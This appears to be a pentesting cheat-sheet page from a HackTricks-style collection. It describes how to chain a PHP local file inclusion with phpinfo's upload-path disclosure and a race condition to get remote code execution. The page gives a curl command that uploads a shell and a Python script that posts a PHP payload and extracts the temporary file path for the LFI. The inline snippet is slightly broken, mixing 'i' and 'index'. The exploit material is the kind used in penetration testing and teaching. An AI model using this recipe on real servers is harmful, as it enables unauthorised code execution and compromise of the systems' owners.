# PHPInfo - From LFI To RCE

[![lfi2rce_via_phpinfo](../../../../_badges/hacktricks/pentesting_web/file_inclusion/lfi2rce_via_phpinfo.svg)](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo)

<div class="row row-cols-lg-2"><div>

If we have access to a LFI and there is no suffix appended, such as `include('pages/'.$_GET['page'])`, we can exploit the PHPInfo via a Race Condition and the LFI to get a RCE.

* `curl "URL/phpinfo.php" -F "file=/path/to/shell.php"`
* `cat /tmp/fif3cd4is` contains the uploaded file
* The file is deleted when the request is completed
* The page "URL/phpinfo.php" contains the path to the uploaded file

On Linux, the path is fairly short so we can use `index = r.text.index(b"[tmp_name] =&gt"); path = r.text[i+17:i+31]`. On Windows, you must perform an initial test to avoid regexes.
</div><div>

```py
import requests
import re

tmp_name_pattern = re.compile(r'\[tmp_name]\s*=&gt;\s+(.*)')

r = requests.post(
    'http://localhost/phpinfo.php',
    files={
        'file': ('file', b'<?php /*YOUR PHP CODE*/ ?>')
    }
)
match = tmp_name_pattern.search(r.text)
path = match.group(1)
# Use {path} quickly in your LFI
```
</div></div>